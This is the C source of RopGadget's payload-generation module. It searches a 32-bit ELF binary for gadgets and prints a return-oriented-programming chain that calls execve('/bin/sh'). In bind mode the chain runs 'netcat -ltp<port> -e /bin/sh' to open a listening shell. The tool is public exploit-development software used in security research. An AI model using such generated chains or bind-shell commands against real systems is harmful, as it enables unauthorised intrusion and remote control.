/*
** RopGadget - Release v3.4.2
** Jonathan Salwan - http://twitter.com/JonathanSalwan
** http://shell-storm.org
** 2012-11-11
**
** This program is free software; you can redistribute it and/or modify
** it under the terms of the GNU General Public License as published by
** the Free Software Foundation; either version 2 of the License, or
** (at your option) any later version.
**
** This program is distributed in the hope that it will be useful,
** but WITHOUT ANY WARRANTY; without even the implied warranty of
** MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
** GNU General Public License for more details.
**
** You should have received a copy of the GNU General Public License
** along with this program; if not, write to the Free Software
** Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
/*
** Make a payload.
** 4 parties:
**
**   1) write "/bin/sh\0" in .data or "/usr/bin/netcat\0" if -bind flag is enable
**   2) registers initialisation
**   3) initialisation of %eax for execve() syscall
**   4) call "int 0x80" or "sysenter"
**
*/

#include "ropgadget.h"

/* linked list for gadgets */
t_makecode *add_element(t_makecode *old_element, char *instruction, Elf32_Addr addr)
{
  t_makecode *new_element;

  new_element = xmalloc(sizeof(t_makecode));
  new_element->addr        = addr;
  new_element->instruction = instruction;
  new_element->next        = old_element;

  return (new_element);
}

/* free linked list */
static void free_add_element(t_makecode *element)
{
  t_makecode *tmp;

  while (element)
    {
      tmp = element;
      element = tmp->next;
      free(tmp);
    }
}

/* returns addr of instruction */
static Elf32_Addr ret_addr_makecodefunc(t_makecode *list_ins, char *instruction)
{
  char  *p;

  for (; list_ins; list_ins = list_ins->next)
    for (p = list_ins->instruction; *p != 0; p++)
      if (!match(p, instruction, strlen(instruction)))
        return list_ins->addr;

  return 0;
}

/* returns the numbers of pop in the gadget. */
static int how_many_pop(char *gadget)
{
  int  cpt = 0;
  char *p;

  for (p = gadget; *p != '\0'; p++)
    if (!strncmp(p, "pop", 3))
      cpt++;

  return cpt;
}

/* returns first reg in "mov %e?x,(%e?x)" instruction */
static char *get_first_reg(char *gadget)
{
  char *p;

  p = xmalloc(4 * sizeof(char));
  while (*gadget != '(' && *gadget != '\0')
    gadget++;

  gadget -= 4;
  strncpy(p, gadget, 3);
  return (p);
}

/* returns second reg in "mov %e?x,(%e?x)" instruction */
static char *get_second_reg(char *gadget)
{
  char *p;

  p = xmalloc(4 * sizeof(char));
  while (*gadget != '(' && *gadget != '\0')
    gadget++;

  gadget += 2;
  strncpy(p, gadget, 3);
  return (p);
}

/* returns the numbers of "pop" befor pop_reg */
static int how_many_pop_before(char *gadget, char *pop_reg)
{
  int cpt = 0;

  for (; strncmp(gadget, pop_reg, strlen(pop_reg)) && *gadget != '\0'; gadget++)
    if (!strncmp(gadget, "pop", 3))
      cpt++;

  return cpt;
}

/* returns the numbers of "pop" after pop_reg */
static int how_many_pop_after(char *gadget, char *pop_reg)
{
  int cpt = 0;

  for(; strncmp(gadget, pop_reg, strlen(pop_reg)); gadget++)
    if (*gadget == '\0')
      return 0;

  gadget += strlen(pop_reg);

  for (; *gadget != '\0'; gadget++)
    if (!strncmp(gadget, "pop", 3))
      cpt++;

  return cpt;
}

/* display padding */
static void display_padding(int i)
{
  for (; i != 0; i--)
    fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x42424242) # padding%s\n", BLUE, ENDC);
}

static void print_code(int word, char *comment)
{
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # %s%s\n", BLUE, word, comment, ENDC);
}

static void print_code_padded(int addr, char *asm1, char *asm2)
{
  print_code(addr, asm1);
  display_padding(how_many_pop_before(asm1, asm2));
}

static void print_code_padded1(int addr, char *asm1)
{
  print_code(addr, asm1);
  display_padding(how_many_pop(asm1));
}

static void print_data_addr(int offset)
{
  fprintf(stdout, "\t\t%sp += pack(\"<I\", 0x%.8x) # @ .data + %d%s\n", BLUE, Addr_sData + offset, offset, ENDC);
}

static void print_data_addr_padded(int offset, char *asm1, char *asm2)
{
  print_data_addr(offset);
  display_padding(how_many_pop_after(asm1, asm2));
}

static void print_quad(char *quad)
{
  char tmp[5] = {0};
  strncpy(tmp, quad, 4);
  fprintf(stdout, "\t\t%sp += \"%s\"%s\n", BLUE, tmp, ENDC);
}

static void print_quad_padded(char *quad, char *asm1, char *asm2)
{
  print_quad(quad);
  display_padding(how_many_pop_after(asm1, asm2));
}

static void print_string(char *str,
Elf32_Addr addr_pop_stack_gadget, char *pop_stack_gadget, char *reg_stack,
Elf32_Addr addr_pop_binsh_gadget, char *pop_binsh_gadget, char *reg_binsh,
Elf32_Addr addr_mov_gadget, char *mov_gadget,
Elf32_Addr addr_xor_gadget, char *xor_gadget,
int offset_start)
{
  int i;
  int l = strlen(str);

  for (i = 0; i <= l; i+=4)
    {
      print_code_padded(addr_pop_stack_gadget, pop_stack_gadget, reg_stack);
      print_data_addr_padded(offset_start + i, pop_stack_gadget, reg_stack);
      if (i < l)
        {
          print_code_padded(addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh);
          print_quad_padded(str+i, pop_binsh_gadget, reg_binsh);
        }
      else
        {
          print_code_padded1(addr_xor_gadget, xor_gadget);
        }
      print_code_padded1(addr_mov_gadget, mov_gadget);
    }
}

static void print_vector(int *args,
Elf32_Addr addr_pop_stack_gadget, char *pop_stack_gadget, char *reg_stack,
Elf32_Addr addr_pop_binsh_gadget, char *pop_binsh_gadget, char *reg_binsh,
Elf32_Addr addr_mov_gadget, char *mov_gadget,
Elf32_Addr addr_xor_gadget, char *xor_gadget,
int offset_start)
{
  int i;

  for (i = 0; 1; i++)
    {
      print_code_padded(addr_pop_stack_gadget, pop_stack_gadget, reg_stack);
      print_data_addr_padded(offset_start + 4*i, pop_stack_gadget, reg_stack);
      if (args[i] != -1)
        {
          print_code_padded(addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh);
          print_data_addr_padded(args[i], pop_binsh_gadget, reg_binsh);
        }
      else
        {
          print_code_padded1(addr_xor_gadget, xor_gadget);
        }
      print_code_padded1(addr_mov_gadget, mov_gadget);
      if (args[i] == -1)
        return;
    }
}

/* local: partie 1 | write /bin/sh in .data for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 1 bis | write //usr/bin/netcat -ltp6666 -e///bin//sh in .data */
static void makepartie1(t_makecode *list_ins, int local)
{
  Elf32_Addr addr_mov_gadget;
  Elf32_Addr addr_xor_gadget;
  Elf32_Addr addr_pop_stack_gadget;
  Elf32_Addr addr_pop_binsh_gadget;
  char *mov_gadget;
  char *xor_gadget;
  char *pop_stack_gadget;
  char *pop_binsh_gadget;
  char *first_reg;
  char *second_reg;
  char reg_stack[32] = "pop %";
  char reg_binsh[32] = "pop %";
  char instr_xor[32] = "xor %";


  addr_mov_gadget = ret_addr_makecodefunc(list_ins, "mov %e?x,(%e?x)");
  mov_gadget = get_gadget_since_addr_att(addr_mov_gadget);

  first_reg = get_first_reg(mov_gadget);
  second_reg = get_second_reg(mov_gadget);

  strncat(reg_stack, second_reg, 3);
  strncat(reg_binsh, first_reg, 3);
  strncat(instr_xor, first_reg, 3);

  addr_pop_stack_gadget = ret_addr_makecodefunc(list_ins, reg_stack);
  pop_stack_gadget = get_gadget_since_addr_att(addr_pop_stack_gadget);
  addr_pop_binsh_gadget = ret_addr_makecodefunc(list_ins, reg_binsh);
  pop_binsh_gadget = get_gadget_since_addr_att(addr_pop_binsh_gadget);

  addr_xor_gadget = ret_addr_makecodefunc(list_ins, instr_xor);
  xor_gadget = get_gadget_since_addr(addr_xor_gadget);

  fprintf(stdout, "\t%sPayload%s\n", YELLOW, ENDC);
  if (local)
    {
      fprintf(stdout, "\t\t%s# execve /bin/sh generated by RopGadget v3.4.2%s\n", BLUE, ENDC);

      print_string("/bin//sh",
        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
        addr_mov_gadget, mov_gadget,
        addr_xor_gadget, xor_gadget, 0);
    }
  else
    {
      fprintf(stdout, "\t\t%s# execve /bin/sh bindport %d generated by RopGadget v3.4.2%s\n", BLUE, bind_mode.port, ENDC);

      print_string("//usr/bin/netcat",
        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
        addr_mov_gadget, mov_gadget,
        addr_xor_gadget, xor_gadget, 0);

      char opts[9] = {0};
      sprintf(opts, "-ltp%d", bind_mode.port);

      print_string(opts,
        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
        addr_mov_gadget, mov_gadget,
        addr_xor_gadget, xor_gadget, 17);

      print_string("-e///bin//sh",
        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
        addr_mov_gadget, mov_gadget,
        addr_xor_gadget, xor_gadget, 26);

      int offsets[] = {0, 17, 26, -1};

      print_vector(&offsets[0],
        addr_pop_stack_gadget, pop_stack_gadget, reg_stack,
        addr_pop_binsh_gadget, pop_binsh_gadget, reg_binsh,
        addr_mov_gadget, mov_gadget,
        addr_xor_gadget, xor_gadget, 40);
    }
  free(first_reg);
  free(second_reg);
}

/* local: partie 2 init reg => %ebx = "/bin/sh\0" | %ecx = "\0" | %edx = "\0"  for execve("/bin/sh", NULL, NULL)*/
/* remote: partie 2 bis init reg => %ebx = "/usb/bin/netcat\0" | %ecx = arg | %edx = "\0" */
static void makepartie2(t_makecode *list_ins, int local)
{
  Elf32_Addr addr_pop_ebx;
  Elf32_Addr addr_pop_ecx;
  Elf32_Addr addr_pop_edx;
  char *pop_ebx_gadget;
  char *pop_ecx_gadget;
  char *pop_edx_gadget;

  addr_pop_ebx = ret_addr_makecodefunc(list_ins, "pop %ebx");
  addr_pop_ecx = ret_addr_makecodefunc(list_ins, "pop %ecx");
  addr_pop_edx = ret_addr_makecodefunc(list_ins, "pop %edx");
  pop_ebx_gadget = get_gadget_since_addr_att(addr_pop_ebx);
  pop_ecx_gadget = get_gadget_since_addr_att(addr_pop_ecx);
  pop_edx_gadget = get_gadget_since_addr_att(addr_pop_edx);

  /* set %ebx */
  print_code_padded(addr_pop_ebx, pop_ebx_gadget, "pop %ebx");
  print_data_addr_padded(0, pop_ebx_gadget, "pop %ebx");

  /* set %ecx */
  print_code_padded(addr_pop_ecx, pop_ecx_gadget, "pop %ecx");
  print_data_addr_padded(local?8:40, pop_ecx_gadget, "pop %ecx");

  /* set %edx */
  print_code_padded(addr_pop_edx, pop_edx_gadget, "pop %edx");
  print_data_addr_padded(local?8:52, pop_edx_gadget, "pop %edx");
}

/* partie 3 init eax = 0xb (execve) */
static void makepartie3(t_makecode *list_ins)
{
  Elf32_Addr addr_xor_eax;
  Elf32_Addr addr_inc_eax;
  char *xor_eax_gadget;
  char *inc_eax_gadget;
  int i;

  addr_xor_eax = ret_addr_makecodefunc(list_ins, "xor %eax,%eax");
  addr_inc_eax = ret_addr_makecodefunc(list_ins, "inc %eax");
  xor_eax_gadget = get_gadget_since_addr_att(addr_xor_eax);
  inc_eax_gadget = get_gadget_since_addr_att(addr_inc_eax);

  /* set %eax => 0 */
  print_code(addr_xor_eax, xor_eax_gadget);
  display_padding(how_many_pop(xor_eax_gadget));

  /* set %eax => 0xb for sys_execve() */
  for (i = 0; i != 0xb; i++)
    print_code_padded1(addr_inc_eax, inc_eax_gadget);
}

/* partie 4 call "int 0x80" or "sysenter" */
static void makepartie4(t_makecode *list_ins)
{
  Elf32_Addr addr_int_0x80;
  Elf32_Addr addr_sysenter;
  Elf32_Addr addr_pop_ebp;
  char *pop_ebp_gadget;

  addr_int_0x80 = ret_addr_makecodefunc(list_ins, "int $0x80");
  addr_sysenter = ret_addr_makecodefunc(list_ins, "sysenter");
  addr_pop_ebp  = ret_addr_makecodefunc(list_ins, "pop %ebp");
  pop_ebp_gadget = get_gadget_since_addr_att(addr_pop_ebp);

  if (addr_int_0x80)
    print_code(addr_int_0x80, "int $0x80");
  else if (addr_sysenter)
    {
      print_code(addr_pop_ebp, pop_ebp_gadget);
      print_data_addr(0);
      print_code(addr_sysenter, "sysenter");
    }
}

void makecode(t_makecode *list_ins)
{
  makepartie1(list_ins, !bind_mode.flag);
  makepartie2(list_ins, !bind_mode.flag);
  makepartie3(list_ins);
  makepartie4(list_ins);
  fprintf(stdout, "\t%sEOF Payload%s\n", YELLOW, ENDC);
  free_add_element(list_ins);
}
